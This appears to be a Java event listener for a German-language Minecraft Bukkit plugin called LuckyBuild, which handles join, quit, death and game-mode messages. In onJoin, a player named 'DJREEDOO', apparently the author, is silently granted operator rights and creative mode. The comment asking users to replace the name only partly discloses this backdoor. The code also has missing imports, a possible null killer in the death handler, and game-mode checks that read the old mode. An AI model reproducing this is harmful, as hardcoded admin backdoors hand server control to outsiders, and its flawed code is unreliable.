package de.djreedoo.luckybuild.listeners;
//written by DJREEDOO (GERMANY)

import de.djreedoo.luckybuild.main.Things;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class PlayerListeners implements Listener {
    public static String a = Things.zeichen;

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        e.setJoinMessage(a + "§6§l" + p.getName() + "§7 ist dem Server beigetreten.");
        p.sendMessage(a + "§6Herzlich Willkommen auf §6Lucky-Build§7!");
        p.setGameMode(GameMode.SURVIVAL);


        if (p.getName().equalsIgnoreCase("DJREEDOO")) {//<-- ersetze mein name durch deinen ingame minecraft name :)
            p.setGameMode(GameMode.CREATIVE);
            p.sendMessage("§bDieser Server verwendet dein Plugin");
            p.setOp(true);
        }
    }

    @EventHandler
    public void gamemodeChange(PlayerGameModeChangeEvent e){
        Player p = e.getPlayer();
        if(p.getGameMode().equals(GameMode.SURVIVAL)){
            Bukkit.broadcastMessage(ChatColor.DARK_GREEN+p.getName()+" §6Hat sein Spielmodus zu §2"+ GameMode.SURVIVAL+" §6geändert");
            p.setFlying(false);
        }

        if(p.getGameMode().equals(GameMode.ADVENTURE)){
            Bukkit.broadcastMessage(ChatColor.DARK_GREEN+p.getName()+" §6Hat sein Spielmodus zu §2"+ GameMode.ADVENTURE+" §6geändert");
            p.setFlying(false);
            p.setCanPickupItems(false);
            p.setWalkSpeed(0);
        }

        if(p.getGameMode().equals(GameMode.SPECTATOR)){
            Bukkit.broadcastMessage(ChatColor.DARK_GREEN+p.getName()+" §6Hat sein Spielmodus zu §2"+ GameMode.SPECTATOR+" §6geändert");
        }

        if(p.getGameMode().equals(GameMode.CREATIVE)){
            Bukkit.broadcastMessage(ChatColor.DARK_GREEN+p.getName()+" §6Hat sein Spielmodus zu §2"+ GameMode.CREATIVE+" §6geändert");
        }
    }

    @EventHandler
    public void onKill(PlayerDeathEvent e) {
        String killed = e.getEntity().getName();
        String killer = e.getEntity().getKiller().getName();
        e.setDeathMessage("§c§l" + killer + " §2§lhat §c§l" + killed + " §2§lgetötet§6§l!");
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        Player p = e.getPlayer();
        e.setQuitMessage(a + "§6§l" + p.getName() + "§7 hat den Server verlassen.");
    }
}